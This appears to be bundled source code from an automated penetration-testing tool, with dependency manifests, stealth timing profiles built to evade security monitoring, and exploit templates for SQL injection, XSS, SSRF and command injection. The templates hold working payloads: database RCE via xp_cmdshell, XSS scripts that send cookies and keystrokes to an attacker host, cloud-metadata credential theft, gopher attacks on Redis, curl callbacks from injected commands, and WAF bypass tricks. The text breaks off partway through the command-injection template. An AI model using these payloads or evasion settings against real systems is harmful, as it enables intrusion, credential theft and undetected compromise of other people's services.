    init_scan_server_executor();
    COMMON_MANIFESTS = {
      // Web exploitation
      web_basic: [
        { type: "python", name: "requests", required: true },
        { type: "python", name: "beautifulsoup4", required: false, fallback: "html.parser" },
        { type: "python", name: "urllib3", required: true }
      ],
      web_advanced: [
        { type: "python", name: "requests", required: true },
        { type: "python", name: "beautifulsoup4", required: false },
        { type: "python", name: "pyjwt", required: false },
        { type: "python", name: "cryptography", required: false },
        { type: "system", name: "curl", required: true }
      ],
      // SQL injection
      sqli: [
        { type: "python", name: "requests", required: true },
        { type: "system", name: "sqlmap", required: false, installCmd: "pip3 install sqlmap" }
      ],
      // Command injection
      cmdi: [
        { type: "python", name: "requests", required: true },
        { type: "python", name: "pwntools", required: false },
        { type: "system", name: "nc", required: false, fallback: "ncat" }
      ],
      // Network exploitation
      network: [
        { type: "python", name: "scapy", required: false },
        { type: "python", name: "impacket", required: false },
        { type: "go", name: "naabu", required: true, installCmd: "go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest" },
        { type: "system", name: "masscan", required: false },
        { type: "system", name: "netcat-openbsd", required: false }
      ],
      // Brute force
      bruteforce: [
        { type: "python", name: "requests", required: true },
        { type: "system", name: "hydra", required: false },
        { type: "system", name: "ffuf", required: false, installCmd: "go install github.com/ffuf/ffuf/v2@latest" },
        { type: "wordlist", name: "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt", required: false }
      ],
      // Deserialization
      deserialization: [
        { type: "python", name: "requests", required: true },
        { type: "python", name: "pyyaml", required: false },
        { type: "python", name: "pickle", required: false },
        { type: "system", name: "ysoserial", required: false }
      ],
      // XXE
      xxe: [
        { type: "python", name: "requests", required: true },
        { type: "python", name: "lxml", required: false }
      ],
      // SSRF
      ssrf: [
        { type: "python", name: "requests", required: true },
        { type: "python", name: "ipaddress", required: false }
      ],
      // Privilege escalation
      privesc: [
        { type: "python", name: "paramiko", required: false },
        { type: "system", name: "linpeas.sh", required: false, installCmd: "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /usr/local/bin/linpeas.sh && chmod +x /usr/local/bin/linpeas.sh" }
      ],
      // Scanning/recon
      recon: [
        { type: "go", name: "naabu", required: true, installCmd: "go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest" },
        { type: "system", name: "masscan", required: false },
        { type: "go", name: "httpx", required: false, installCmd: "go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest" },
        { type: "go", name: "nuclei", required: false, installCmd: "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest" },
        { type: "go", name: "subfinder", required: false, installCmd: "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest" }
      ]
    };
    installCache = /* @__PURE__ */ new Map();
    CACHE_TTL_MS = 30 * 60 * 1e3;
    PYTHON_STDLIB = /* @__PURE__ */ new Set([
      "os",
      "sys",
      "json",
      "base64",
      "hashlib",
      "hmac",
      "http",
      "urllib",
      "socket",
      "ssl",
      "struct",
      "subprocess",
      "threading",
      "time",
      "datetime",
      "re",
      "io",
      "pathlib",
      "tempfile",
      "shutil",
      "glob",
      "fnmatch",
      "argparse",
      "logging",
      "collections",
      "itertools",
      "functools",
      "string",
      "textwrap",
      "random",
      "secrets",
      "math",
      "binascii",
      "codecs",
      "csv",
      "xml",
      "html",
      "email",
      "mimetypes",
      "pickle",
      "shelve",
      "sqlite3",
      "zlib",
      "gzip",
      "zipfile",
      "tarfile",
      "copy",
      "pprint",
      "enum",
      "abc",
      "contextlib",
      "signal",
      "ipaddress",
      "uuid",
      "traceback",
      "inspect",
      "typing"
    ]);
    PYTHON_PACKAGE_MAP = {
      bs4: "beautifulsoup4",
      cv2: "opencv-python",
      PIL: "Pillow",
      yaml: "pyyaml",
      jwt: "pyjwt",
      Crypto: "pycryptodome",
      paramiko: "paramiko",
      scapy: "scapy",
      impacket: "impacket",
      pwn: "pwntools",
      pwnlib: "pwntools",
      shodan: "shodan",
      censys: "censys",
      naabu: "python-nmap",
      // legacy mapping, naabu replaces nmap
      dns: "dnspython",
      ldap: "python-ldap",
      pymongo: "pymongo",
      redis: "redis",
      psycopg2: "psycopg2-binary",
      mysql: "mysql-connector-python"
    };
    BASH_BUILTINS = /* @__PURE__ */ new Set([
      "echo",
      "printf",
      "read",
      "cd",
      "pwd",
      "export",
      "unset",
      "set",
      "test",
      "[",
      "[[",
      "if",
      "then",
      "else",
      "fi",
      "for",
      "while",
      "do",
      "done",
      "case",
      "esac",
      "function",
      "return",
      "exit",
      "source",
      ".",
      "eval",
      "exec",
      "trap",
      "wait",
      "kill",
      "true",
      "false",
      "shift",
      "local",
      "declare",
      "typeset",
      "readonly",
      "let",
      "getopts"
    ]);
  }
});

// server/lib/stealth-controls.ts
function getTimingProfile(profile) {
  return TIMING_PROFILES[profile];
}
function createStealthController(config = {}) {
  const profile = config.profile || "normal";
  const timing = getTimingProfile(profile);
  const fullConfig = {
    profile,
    maxRps: config.maxRps || timing.maxRps,
    jitterRangeMs: config.jitterRangeMs || timing.jitterRangeMs,
    rotateUserAgent: config.rotateUserAgent ?? true,
    benignRatio: config.benignRatio || timing.benignRatio,
    proxies: config.proxies || [],
    proxyRotateAfter: config.proxyRotateAfter || 5,
    respectRobotsTxt: config.respectRobotsTxt ?? false,
    maxConcurrent: config.maxConcurrent || 1
  };
  return {
    config: fullConfig,
    evaluate(targetHost, vulnClass) {
      const [minJitter, maxJitter] = fullConfig.jitterRangeMs;
      const delayMs = Math.floor(Math.random() * (maxJitter - minJitter) + minJitter);
      const shouldDelay = profile !== "aggressive";
      return {
        shouldDelay,
        delayMs: shouldDelay ? delayMs : 0,
        profile,
        reason: shouldDelay ? `Stealth profile '${profile}': applying ${delayMs}ms jitter for ${vulnClass} against ${targetHost}` : `Aggressive profile: no delay for ${vulnClass}`
      };
    }
  };
}
var TIMING_PROFILES, USER_AGENTS, ALL_BROWSER_UAS;
var init_stealth_controls = __esm({
  "server/lib/stealth-controls.ts"() {
    "use strict";
    init_scan_server_executor();
    TIMING_PROFILES = {
      aggressive: {
        maxRps: 50,
        jitterRangeMs: [10, 100],
        benignRatio: 0,
        description: "Maximum speed, no stealth. Use only in authorized lab environments."
      },
      normal: {
        maxRps: 10,
        jitterRangeMs: [100, 500],
        benignRatio: 1,
        description: "Balanced speed and stealth. Suitable for most engagements."
      },
      stealth: {
        maxRps: 2,
        jitterRangeMs: [500, 3e3],
        benignRatio: 3,
        description: "Low and slow. Mimics human browsing patterns."
      },
      paranoid: {
        maxRps: 0.2,
        jitterRangeMs: [3e3, 15e3],
        benignRatio: 5,
        description: "Extremely slow. Designed to evade advanced SOC monitoring."
      }
    };
    USER_AGENTS = {
      chrome_windows: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
      ],
      chrome_mac: [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
      ],
      firefox_windows: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0"
      ],
      firefox_linux: [
        "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
      ],
      safari_mac: [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15"
      ],
      edge_windows: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
      ],
      // Pentest tool UAs (for when stealth isn't needed)
      tools: [
        "sqlmap/1.7.12#stable (https://sqlmap.org)",
        "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
        "Mozilla/5.0 (compatible; Naabu Scanner; https://github.com/projectdiscovery/naabu)",
        "Wfuzz/3.1.0"
      ]
    };
    ALL_BROWSER_UAS = [
      ...USER_AGENTS.chrome_windows,
      ...USER_AGENTS.chrome_mac,
      ...USER_AGENTS.firefox_windows,
      ...USER_AGENTS.firefox_linux,
      ...USER_AGENTS.safari_mac,
      ...USER_AGENTS.edge_windows
    ];
  }
});

// server/lib/vuln-class-templates.ts
function getTemplate(vulnClass) {
  return VULN_TEMPLATES[vulnClass];
}
function generateTemplateContext(vulnClass, phase = "all") {
  const template = VULN_TEMPLATES[vulnClass];
  if (!template) return `No template available for vulnerability class: ${vulnClass}`;
  const sections = [];
  sections.push(`=== ${template.name} Exploit Template ===`);
  sections.push(`OWASP WSTG: ${template.wstgIds.join(", ")}`);
  sections.push(`ATT&CK: ${template.attackTechniques.join(", ")}`);
  sections.push(`CWE: ${template.cweIds.join(", ")}`);
  sections.push("");
  if (phase === "all" || phase === "detection") {
    sections.push("--- DETECTION ---");
    sections.push("Signals: " + template.detection.signals.join("; "));
    sections.push("Techniques: " + template.detection.techniques.join("; "));
    sections.push("");
  }
  if (phase === "all" || phase === "validation") {
    sections.push("--- VALIDATION ---");
    sections.push("Steps: " + template.validation.confirmationSteps.join(" \u2192 "));
    sections.push("Proof payloads: " + template.validation.proofPayloads.join("; "));
    sections.push("True positive markers: " + template.validation.truePositiveMarkers.join("; "));
    sections.push("");
  }
  if (phase === "all" || phase === "exploitation") {
    sections.push("--- EXPLOITATION STRATEGIES ---");
    for (const strategy of template.exploitation.strategies) {
      sections.push(`Strategy: ${strategy.name}`);
      sections.push(`  When: ${strategy.condition}`);
      sections.push(`  Approach: ${strategy.approach}`);
      sections.push(`  Pattern: ${strategy.pattern}`);
      sections.push("");
    }
    sections.push("WAF Bypass: " + template.exploitation.wafBypassNotes.join("; "));
    sections.push("");
  }
  if (phase === "all" || phase === "escalation") {
    sections.push("--- ESCALATION ---");
    for (const path of template.escalation.paths) {
      sections.push(`${path.name}: ${path.description} (${path.requiredAccess} \u2192 ${path.targetAccess})`);
    }
    sections.push("Chain opportunities: " + template.escalation.chainOpportunities.join("; "));
    sections.push("");
  }
  sections.push("--- PITFALLS ---");
  sections.push(template.pitfalls.join("; "));
  return sections.join("\n");
}
var VULN_TEMPLATES;
var init_vuln_class_templates = __esm({
  "server/lib/vuln-class-templates.ts"() {
    "use strict";
    VULN_TEMPLATES = {
      // ─────────────────────────────────────────────────────────────────
      // SQL INJECTION
      // ─────────────────────────────────────────────────────────────────
      sqli: {
        vulnClass: "sqli",
        name: "SQL Injection",
        wstgIds: ["WSTG-INPV-05"],
        attackTechniques: ["T1190", "T1059.004"],
        cweIds: ["CWE-89", "CWE-564"],
        detection: {
          signals: [
            "Error messages containing SQL syntax (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)",
            "Different response lengths/times for boolean conditions",
            "Numeric parameters that affect query logic",
            "Search/filter functionality with user input",
            "Login forms, user lookup, data retrieval endpoints"
          ],
          indicators: [
            'SQL error strings: "syntax error", "mysql_fetch", "pg_query", "ORA-", "SQLITE_ERROR"',
            "Stack traces revealing ORM/query builder usage",
            "Response time differences > 2s with time-based payloads",
            "Different HTTP status codes for true/false conditions"
          ],
          techniques: [
            "Single quote injection and error observation",
            "Boolean-based: AND 1=1 vs AND 1=2 response comparison",
            "Time-based: SLEEP/WAITFOR/pg_sleep injection",
            "UNION-based: ORDER BY column enumeration",
            "Error-based: extractvalue/updatexml for MySQL, CAST for MSSQL"
          ],
          falsePositives: [
            "WAF blocking with generic error page (not a SQL error)",
            "Application-level input validation returning custom errors",
            "Rate limiting causing different responses"
          ]
        },
        validation: {
          confirmationSteps: [
            "Inject single quote \u2014 observe SQL error or behavior change",
            "Test boolean conditions: param=1 AND 1=1 vs param=1 AND 1=2",
            "Test time-based: param=1 AND SLEEP(5) \u2014 observe 5s delay",
            "Test UNION: ORDER BY N (increment N until error to find column count)",
            "Confirm with second distinct payload to rule out coincidence"
          ],
          proofPayloads: [
            "' OR '1'='1' --",
            "1 AND 1=1 --",
            "1 AND 1=2 --",
            "1; SELECT SLEEP(5) --",
            "1 UNION SELECT NULL,NULL,NULL --"
          ],
          expectedResponses: [
            "Boolean true: normal response content/length",
            "Boolean false: different content/length or empty result",
            "Time-based: measurable delay matching injected sleep value",
            "UNION: response includes injected NULL columns or error revealing column count",
            "Error-based: SQL error message with database version or table info"
          ],
          truePositiveMarkers: [
            "Consistent boolean behavior across multiple tests",
            "Time delay precisely matches injected value",
            "Error messages contain actual SQL query fragments",
            "UNION injection returns data from other tables"
          ]
        },
        exploitation: {
          strategies: [
            {
              name: "UNION-based extraction",
              condition: "When output is reflected in response and column count is known",
              approach: "Use UNION SELECT to extract data from information_schema, then target tables",
              pattern: "UNION SELECT {column_list} FROM {table} WHERE {condition} --",
              expectedOutcome: "Database contents extracted in response body"
            },
            {
              name: "Boolean-blind extraction",
              condition: "When no direct output but boolean differences observable",
              approach: "Binary search through ASCII values using SUBSTRING and boolean conditions",
              pattern: "AND SUBSTRING((SELECT {column} FROM {table} LIMIT 1),{pos},1)='{char}' --",
              expectedOutcome: "Character-by-character data extraction via response differences"
            },
            {
              name: "Time-blind extraction",
              condition: "When no visible output difference, only timing observable",
              approach: "Use conditional time delays to extract data bit by bit",
              pattern: "AND IF(SUBSTRING((SELECT {column} FROM {table} LIMIT 1),{pos},1)='{char}',SLEEP(3),0) --",
              expectedOutcome: "Data extracted via timing side-channel"
            },
            {
              name: "Stacked queries (MSSQL/PostgreSQL)",
              condition: "When database supports multiple statements",
              approach: "Execute additional SQL statements for RCE or data manipulation",
              pattern: "; EXEC xp_cmdshell('{command}') -- (MSSQL) or ; COPY (SELECT '') TO PROGRAM '{command}' -- (PostgreSQL)",
              expectedOutcome: "OS command execution via database"
            },
            {
              name: "Out-of-band extraction",
              condition: "When no in-band feedback available",
              approach: "Use database-specific functions to make DNS/HTTP requests to attacker server",
              pattern: "LOAD_FILE(CONCAT('\\\\\\\\',({subquery}),'.{oob_domain}\\\\a')) (MySQL)",
              expectedOutcome: "Data exfiltrated via DNS/HTTP to OOB server"
            }
          ],
          environmentNotes: {
            mysql: "Use information_schema.tables/columns. GROUP_CONCAT for multi-row. LOAD_FILE/INTO OUTFILE for file ops.",
            postgresql: "Use pg_catalog. COPY TO/FROM for file ops. PG_SLEEP for time-based.",
            mssql: "Use INFORMATION_SCHEMA. xp_cmdshell for RCE. OPENROWSET for file read.",
            oracle: "Use ALL_TABLES/ALL_TAB_COLUMNS. UTL_HTTP for OOB. DBMS_SCHEDULER for RCE.",
            sqlite: "Limited to file-based ops. No network functions. ATTACH DATABASE for file write."
          },
          wafBypassNotes: [
            "Case variation: SeLeCt, uNiOn",
            "Inline comments: UN/**/ION SE/**/LECT",
            "URL/double encoding",
            "MySQL comment syntax: /*!UNION*/ /*!SELECT*/",
            "Whitespace alternatives: %09, %0a, %0d, /**/",
            "Equivalent functions: MID() instead of SUBSTRING()"
          ],
          encodingNotes: [
            "URL-encode special characters in GET parameters",
            "Double-encode if WAF decodes once",
            'Hex encoding for string literals: 0x41646d696e instead of "Admin"',
            "CHAR() function to avoid quote filtering"
          ]
        },
        escalation: {
          paths: [
            { name: "Data Exfiltration", description: "Extract all database contents", requiredAccess: "sqli", targetAccess: "database_access", technique: "UNION/blind extraction" },
            { name: "Authentication Bypass", description: "Login as any user", requiredAccess: "sqli", targetAccess: "service_account", technique: "OR 1=1 or credential extraction" },
            { name: "OS Command Execution", description: "Execute OS commands via database", requiredAccess: "sqli", targetAccess: "command_execution", technique: "xp_cmdshell/COPY TO PROGRAM/UDF" },
            { name: "File Read/Write", description: "Read/write files on database server", requiredAccess: "sqli", targetAccess: "file_write", technique: "LOAD_FILE/INTO OUTFILE/COPY" }
          ],
          chainOpportunities: [
            "SQLi \u2192 credential extraction \u2192 lateral movement",
            "SQLi \u2192 file write \u2192 webshell \u2192 RCE",
            "SQLi \u2192 OS command \u2192 reverse shell \u2192 privilege escalation",
            "SQLi \u2192 admin credential \u2192 application admin \u2192 further exploitation"
          ]
        },
        evidence: {
          requiredCaptures: ["HTTP request with injection payload", "HTTP response showing SQL error or data extraction", "Database version string", "Sample extracted data (redacted if sensitive)"],
          screenshots: ["SQL error page", "Extracted data in response", "Boolean difference comparison"],
          reportData: ["Injection point (parameter, method, endpoint)", "Database type and version", "Accessible tables/data", "Impact assessment"],
          fedRampNotes: ["Document all accessed data categories", "Note if PII/PHI was accessible", "Record remediation timeline"]
        },
        remediation: [
          "Use parameterized queries / prepared statements",
          "Implement input validation with allowlists",
          "Apply least privilege to database accounts",
          "Enable WAF rules for SQL injection patterns",
          "Disable detailed error messages in production"
        ],
        pitfalls: [
          "Assuming WAF block means not vulnerable \u2014 test bypass techniques",
          "Only testing GET parameters \u2014 check POST, headers, cookies, JSON",
          "Missing second-order SQLi (stored input used in later query)",
          "Not testing all database types (syntax differs)"
        ]
      },
      // ─────────────────────────────────────────────────────────────────
      // CROSS-SITE SCRIPTING (XSS)
      // ─────────────────────────────────────────────────────────────────
      xss: {
        vulnClass: "xss",
        name: "Cross-Site Scripting",
        wstgIds: ["WSTG-INPV-01", "WSTG-INPV-02"],
        attackTechniques: ["T1189", "T1059.007"],
        cweIds: ["CWE-79"],
        detection: {
          signals: [
            "User input reflected in HTML response without encoding",
            "Search functionality echoing query terms",
            "Error messages including user input",
            "User-generated content (comments, profiles, messages)"
          ],
          indicators: [
            "Input reflected verbatim in response body",
            "HTML special characters not encoded",
            "Input placed inside HTML attributes, JavaScript, or CSS contexts",
            "DOM manipulation using URL fragment or query parameters"
          ],
          techniques: [
            "Inject unique string and search for it in response",
            "Test HTML context: <b>test</b>",
            'Test attribute context: " onmouseover="alert(1)',
            "Test JavaScript context: ';alert(1);//",
            "Test DOM-based: Check for document.location, innerHTML usage"
          ],
          falsePositives: [
            "Input reflected but properly HTML-encoded",
            "CSP blocking script execution",
            "WAF stripping payload but underlying vuln exists"
          ]
        },
        validation: {
          confirmationSteps: [
            "Inject unique canary string and find it in response",
            "Determine injection context (HTML body, attribute, JavaScript, URL)",
            "Test context-appropriate breakout payload",
            "Verify script execution with harmless proof",
            "Test with different browsers if DOM-based"
          ],
          proofPayloads: [
            "<img src=x onerror=alert(document.domain)>",
            '"><svg onload=alert(1)>',
            "'-alert(1)-'",
            "<details open ontoggle=alert(1)>"
          ],
          expectedResponses: [
            "Alert/console output showing document.domain",
            "OOB callback received from victim browser context",
            "DOM modification visible in page"
          ],
          truePositiveMarkers: [
            "JavaScript executes in browser context",
            "Can access document.cookie or document.domain",
            "Payload persists across page loads (stored XSS)"
          ]
        },
        exploitation: {
          strategies: [
            {
              name: "Cookie theft",
              condition: "When HttpOnly flag is not set on session cookies",
              approach: "Inject script that sends document.cookie to attacker server",
              pattern: '<script>fetch("https://{oob}/c?"+document.cookie)</script>',
              expectedOutcome: "Session cookie received at OOB server"
            },
            {
              name: "Keylogging",
              condition: "When targeting specific user actions",
              approach: "Inject keylogger that captures form input",
              pattern: '<script>document.onkeypress=e=>fetch("https://{oob}/k?"+e.key)</script>',
              expectedOutcome: "Keystroke data exfiltrated"
            },
            {
              name: "CSRF via XSS",
              condition: "When XSS is in authenticated context",
              approach: "Use XSS to make authenticated requests on behalf of victim",
              pattern: '<script>fetch("/api/admin/action",{method:"POST",credentials:"include",body:JSON.stringify({...})})</script>',
              expectedOutcome: "Privileged actions performed as victim user"
            }
          ],
          environmentNotes: {
            react: 'Auto-escapes JSX. Look for dangerouslySetInnerHTML, href="javascript:".',
            angular: "Sanitizes by default. Look for bypassSecurityTrustHtml, innerHTML bindings.",
            vue: "Escapes by default. Look for v-html directive.",
            jquery: ".html(), .append() with user input are common vectors."
          },
          wafBypassNotes: [
            "Use event handlers: onerror, onload, onfocus, onmouseover",
            "Use SVG: <svg/onload=alert(1)>",
            "Use encoding: HTML entities or Unicode escapes",
            "Use polyglot payloads for multiple contexts",
            "Use mutation XSS (mXSS) for DOM-based bypasses"
          ],
          encodingNotes: [
            "HTML entity encoding for HTML context",
            "JavaScript Unicode escapes for JS context",
            "URL encoding for href/src attributes"
          ]
        },
        escalation: {
          paths: [
            { name: "Session Hijacking", description: "Steal session cookies", requiredAccess: "xss", targetAccess: "service_account", technique: "Cookie theft" },
            { name: "Account Takeover", description: "Change password/email via CSRF", requiredAccess: "xss", targetAccess: "credential_access", technique: "XSS-to-CSRF chain" },
            { name: "Admin Escalation", description: "Target admin users with stored XSS", requiredAccess: "xss", targetAccess: "command_execution", technique: "Stored XSS in admin-viewed content" }
          ],
          chainOpportunities: [
            "XSS \u2192 session hijacking \u2192 account takeover",
            "XSS \u2192 CSRF \u2192 admin action execution",
            "Stored XSS \u2192 admin cookie theft \u2192 admin panel access \u2192 RCE"
          ]
        },
        evidence: {
          requiredCaptures: ["Injection point and context", "Proof of JavaScript execution", "Impact demonstration"],
          screenshots: ["XSS alert/popup", "Browser console showing execution", "OOB callback log"],
          reportData: ["XSS type (reflected, stored, DOM)", "Injection context", "CSP status", "Cookie flags"],
          fedRampNotes: ["Document user data at risk", "Note CSP implementation status"]
        },
        remediation: [
          "Implement context-aware output encoding",
          "Deploy Content Security Policy (CSP) with strict nonce/hash",
          "Set HttpOnly and Secure flags on session cookies",
          "Use modern frameworks with auto-escaping"
        ],
        pitfalls: [
          "Only testing <script>alert(1)</script> \u2014 use context-appropriate payloads",
          "Ignoring DOM-based XSS (requires JavaScript analysis)",
          "Assuming CSP prevents exploitation \u2014 CSP can often be bypassed",
          "Missing stored XSS in less-obvious locations"
        ]
      },
      // ─────────────────────────────────────────────────────────────────
      // SERVER-SIDE REQUEST FORGERY (SSRF)
      // ─────────────────────────────────────────────────────────────────
      ssrf: {
        vulnClass: "ssrf",
        name: "Server-Side Request Forgery",
        wstgIds: ["WSTG-INPV-19"],
        attackTechniques: ["T1090", "T1071"],
        cweIds: ["CWE-918"],
        detection: {
          signals: [
            "URL parameters that fetch remote resources",
            "File import/export functionality",
            "Webhook configuration endpoints",
            "PDF/image generation from URLs",
            "API proxy or gateway endpoints"
          ],
          indicators: [
            "Server makes HTTP requests to user-supplied URLs",
            "Different error messages for reachable vs unreachable hosts",
            "Response time differences for internal vs external IPs"
          ],
          techniques: [
            "Supply external URL and check for OOB callback",
            "Supply internal IP (127.0.0.1, 10.x, 172.16.x) and observe response",
            "Test cloud metadata endpoints (169.254.169.254)",
            "Test different protocols (file://, gopher://, dict://)",
            "Test DNS rebinding for IP-based filters"
          ],
          falsePositives: [
            "Client-side redirects (not server-side)",
            "URL validation that blocks but still resolves DNS"
          ]
        },
        validation: {
          confirmationSteps: [
            "Send request to OOB server and confirm callback received",
            "Request internal service and observe different response",
            "Request cloud metadata and check for data",
            "Test protocol handlers: file:///etc/passwd, gopher://"
          ],
          proofPayloads: [
            "http://{oob_domain}/ssrf-proof",
            "http://127.0.0.1:80/",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]:80/"
          ],
          expectedResponses: [
            "OOB callback from target server IP",
            "Internal service response content",
            "Cloud metadata (IAM role, instance ID)"
          ],
          truePositiveMarkers: [
            "OOB callback source IP matches target server",
            "Internal service data returned in response",
            "Cloud metadata accessible"
          ]
        },
        exploitation: {
          strategies: [
            {
              name: "Cloud metadata extraction",
              condition: "When target runs on AWS/GCP/Azure",
              approach: "Access cloud metadata service to extract IAM credentials",
              pattern: "http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}",
              expectedOutcome: "AWS access keys, session tokens"
            },
            {
              name: "Internal service scanning",
              condition: "When SSRF allows port/host scanning",
              approach: "Enumerate internal network services via response differences",
              pattern: "http://10.0.0.{1-254}:{port}/",
              expectedOutcome: "Map of internal services"
            },
            {
              name: "Internal service exploitation",
              condition: "When internal services found (Redis, Elasticsearch)",
              approach: "Interact with unauthenticated internal services via SSRF",
              pattern: "gopher://127.0.0.1:6379/_SET%20pwned%20true",
              expectedOutcome: "Data extraction or command execution on internal services"
            },
            {
              name: "File read via protocol handlers",
              condition: "When file:// protocol is supported",
              approach: "Read local files from the server filesystem",
              pattern: "file:///etc/passwd or file:///proc/self/environ",
              expectedOutcome: "Local file contents including credentials"
            }
          ],
          environmentNotes: {
            aws: "IMDSv1: http://169.254.169.254/. IMDSv2 requires PUT with token header.",
            gcp: "http://metadata.google.internal/ with Metadata-Flavor: Google header.",
            azure: "http://169.254.169.254/metadata/instance with Metadata: true header.",
            kubernetes: "Check https://kubernetes.default.svc for service account tokens.",
            docker: "Check http://172.17.0.1:2375 for Docker API access."
          },
          wafBypassNotes: [
            "IP encoding: 0x7f000001, 2130706433 for 127.0.0.1",
            "IPv6: [::1], [0:0:0:0:0:ffff:127.0.0.1]",
            "DNS rebinding to bypass IP-based filters",
            "URL shorteners or redirect chains",
            "Alternate protocols: gopher://, dict://",
            "Domain that resolves to internal IP"
          ],
          encodingNotes: [
            "URL-encode dots and slashes in IP addresses",
            "Decimal/hex/octal IP representations",
            "Use @ in URL: http://attacker@127.0.0.1/"
          ]
        },
        escalation: {
          paths: [
            { name: "Cloud Account Takeover", description: "Extract IAM credentials from metadata", requiredAccess: "ssrf", targetAccess: "credential_access", technique: "Cloud metadata exploitation" },
            { name: "Internal Network Pivot", description: "Access internal services", requiredAccess: "ssrf", targetAccess: "database_access", technique: "Internal service interaction" },
            { name: "RCE via Internal Services", description: "Execute commands via Redis/Elasticsearch", requiredAccess: "ssrf", targetAccess: "command_execution", technique: "Gopher protocol to internal services" }
          ],
          chainOpportunities: [
            "SSRF \u2192 cloud metadata \u2192 IAM credential theft \u2192 full cloud access",
            "SSRF \u2192 internal Redis \u2192 Redis RCE \u2192 server shell",
            "SSRF \u2192 Kubernetes API \u2192 container escape \u2192 cluster takeover"
          ]
        },
        evidence: {
          requiredCaptures: ["SSRF request and response", "OOB callback proof", "Internal data accessed"],
          screenshots: ["OOB callback log", "Internal service response", "Cloud metadata response"],
          reportData: ["SSRF endpoint and parameter", "Accessible internal services", "Data at risk"],
          fedRampNotes: ["Document cloud credential exposure", "Note internal network segmentation gaps"]
        },
        remediation: [
          "Implement allowlist of permitted destination hosts/IPs",
          "Block requests to private IP ranges and link-local addresses",
          "Use IMDSv2 (AWS) for token-based metadata access",
          "Disable unnecessary protocol handlers",
          "Validate and sanitize all user-supplied URLs"
        ],
        pitfalls: [
          "Only testing http:// \u2014 test file://, gopher://, dict://",
          "Assuming IP blocklist is sufficient \u2014 test encoding bypasses",
          "Missing blind SSRF \u2014 use OOB detection",
          "Not testing for DNS rebinding attacks"
        ]
      },
      // ─────────────────────────────────────────────────────────────────
      // COMMAND INJECTION
      // ─────────────────────────────────────────────────────────────────
      cmdi: {
        vulnClass: "cmdi",
        name: "OS Command Injection",
        wstgIds: ["WSTG-INPV-12"],
        attackTechniques: ["T1059", "T1059.004"],
        cweIds: ["CWE-78", "CWE-77"],
        detection: {
          signals: [
            "Parameters that interact with system operations (ping, traceroute, DNS)",
            "File operations (upload, download, conversion)",
            "System administration interfaces",
            "Diagnostic/health check endpoints"
          ],
          indicators: [
            "Response includes OS command output format",
            "Time-based: sleep injection causes delay",
            "Error messages revealing shell syntax",
            "Different behavior with shell metacharacters"
          ],
          techniques: [
            "Inject ; sleep 5 and measure response time",
            "Inject | id and look for uid= in response",
            "Inject $(whoami) or `whoami` in parameters",
            "Test blind with OOB: $(curl http://oob/)",
            "Test separators: ;, |, ||, &&, \\n, %0a"
          ],
          falsePositives: [
            "Application timeout (not caused by injected sleep)",
            "Input validation stripping metacharacters"
          ]
        },
        validation: {
          confirmationSteps: [
            "Inject time-based payload: ; sleep 5 \u2014 confirm delay",
            "Inject identity command: ; id \u2014 look for uid= output",
            "Inject OOB callback: ; curl http://oob/",
            "Test multiple separators"
          ],
          proofPayloads: [
            "; sleep 5",
            "| id",
            "$(whoami)",
            "`cat /etc/hostname`",
            "; curl http://{oob}/cmdi-proof"
          ],
          expectedResponses: [
            "Time delay matching injected sleep value",
            "uid=xxx(xxx) gid=xxx(xxx) in response",
            "OOB callback received from target IP"
          ],
          truePositiveMarkers: [
            "OS command output in response",
            "Precise time delay matching injection",
            "OOB callback from target server"
          ]
        },
        exploitation: {
          strategies: [
            {
              name: "Direct command execution",
              condition: "When command output is reflected in response",
              approach: "Execute commands and read output directly",
              pattern: "; {command}",
              expectedOutcome: "Full command output in response"
            },
            {
              name: "Blind with OOB exfiltration",
